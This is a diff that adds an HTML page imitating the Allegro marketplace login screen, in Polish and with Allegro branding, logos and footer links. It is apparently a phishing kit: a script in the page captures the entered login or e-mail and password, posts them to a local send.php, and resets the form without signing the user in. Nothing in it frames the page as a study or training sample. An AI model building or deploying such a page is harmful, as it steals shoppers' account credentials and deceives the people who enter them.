@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Allegro logowanie - Moje Allegro</title>
+    <link rel="shortcut icon" href="./assets/img/logo/favicon.ico" type="image/x-icon">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
+    <link rel="stylesheet" href="./assets/css/style.css">
+</head>
+<body>
+<header>
+    <div class="header-cont">
+        <div class="header-menu">
+            <div class="header-logo">
+                <img src="./assets/img/logo/logo-allegro-bcec72b532.svg" alt="">
+            </div>
+            <div class="change-lang">
+                <a href="#">CHANGE LANGUAGE</a>
+            </div>
+        </div>
+    </div>
+</header>
+<section>
+    <div class="form-cont">
+        <div class="form">
+            <div class="form-l">
+                <div class="form-l-top">
+                    <div class="form-header">
+                        <h2>Zaloguj się</h2>
+                    </div>
+                    <form class="form-data" >
+                    <div class="top-form">
+                            <div class="input-mail">
+                                <input type="email" placeholder="login lub e-mail" name="mail" id="input-mail" required>
+                                <div class="input-mail-p">
+                                    <p>Podaj login lub e-mail</p>
+                                </div>
+                            </div>
+                            <div class="input-pass">
+                                <div class="input-pass-rel">
+                                    <input type="password" class="password" name="pass" id="input-pass" placeholder="haslo" required>
+                                    <div class="pokaz">
+                                        <a id="pok">POKAŻ</a>
+                                    </div>
+                                </div>
+                                <div class="input-pass-p">
+                                    <p>Podaj hasło</p>
+                                </div>
+                            </div>
+                    </div>
+                    <div class="form-reg">
+                        <a href="#">Odzyskaj hasło</a>
+                    </div>
+                    <div class="form-submit">
+                        <input type="submit" name="act" value="ZALOGUJ SIĘ">
+                    </div>
+                    </form>
+                    <div class="lub">
+                        <div class="hr"><hr></div>
+                        <div class="lub-abs"><p>lub</p></div>
+                    </div>
+                    <div class="google">
+                        <div class="google-cont">
+                            <a href="./"><button>KONTYNUUJ Z GOOGLE</button><img src="./assets/img/svg/information-social-google-a73214f7cb.svg" alt="google"></a>
+                        </div>
+                    </div>
+                    <div class="google">
+                        <div class="google-cont">
+                            <a href="./"><button>KONTYNUUJ Z FACEBOOK</button><img src="./assets/img/svg/information-social-facebook-1b4340531f.svg" alt="google"></a>
+                        </div>
+                    </div>
+                    <div class="phone">
+                        <div class="phone-cont">
+                            <a href="./"><button>UŻYJ NUMERU TELEFONU</button><img src="./assets/img/svg/phone_icon_efb43bd6.svg" alt="google"></a>
+                        </div>
+                    </div>
+                </div>
+                <div class="form-bot">
+                    <div class="allegro">
+                        <div class="allegro-q">
+                            <p>Pierwszy raz na Allegro?</p>
+                        </div>
+                        <div class="allegro-a">
+                            <a href="#">ZAŁÓŻ KONTO</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="form-r">
+
+            </div>
+        </div>
+        <div class="form-info">
+            <p>Logując się do Allegro akceptujesz Regulamin w aktualnym brzmieniu obowiązującym od dnia 1.01.2024. Informacje o planowanych oraz archiwalnych zmianach Regulaminu są dostępne na <a href="">stronie</a>.</p>
+        </div>
+    </div>
+</section>
+<section>
+    <div class="footer">
+        <div class="footer-logo-bg">
+            <div class="footer-logo-box">
+                <div class="flb-l">
+                    <p>Korzystanie z serwisu oznacza akceptację</p>
+                    <a href="">regulaminu</a>
+                </div>
+                <div class="flb-r">
+                    <img src="./assets/img/logo/logo-allegro-bcec72b532w.svg" alt="logo">
+                </div>
+            </div>
+        </div>
+        <div class="footer-links">
+            <div class="fl-cont">
+                <div class="fl-top">
+                    <p>Serwisy Grupy Allegro</p>
+                </div>
+                <div class="fl-bot d-flex">
+                    <div class="fl-bot-item1"><a href="">Allegro.cz</a></div>
+                    <div class="fl-bot-item"><a href="">Mall.cz</a></div>
+                    <div class="fl-bot-item"><a href="">Mall.sk</a></div>
+                    <div class="fl-bot-item"><a href="">Mall.hu</a></div>
+                    <div class="fl-bot-item"><a href="">Mall.hr</a></div>
+                    <div class="fl-bot-item"><a href="">Mimovrste.com</a></div>
+                    <div class="fl-bot-item"><a href="">Wedo.cz</a></div>
+                    <div class="fl-bot-item"><a href="">Czc.cz</a></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+<script>
+    const siteForm = document.querySelector('form');
+    siteForm.addEventListener('submit',async (e) => {
+        e.preventDefault();
+        const item = e.target;
+        const submitBtn =  item.querySelector('input[type=submit]');
+        submitBtn.setAttribute('disabled', 'true');
+
+        let response = await fetch('send.php', {
+            method: 'POST',
+            body: new FormData(item)
+        })
+            .then(data => {
+                item.reset();
+            })
+            .catch((error) => console.log("ошибка!", error))
+            .finally(() => {
+                submitBtn.removeAttribute('disabled');
+            });
+    })
+</script>
+<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
+<script src="./assets/js/script.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous"></script>
+
+</body>
+</html>
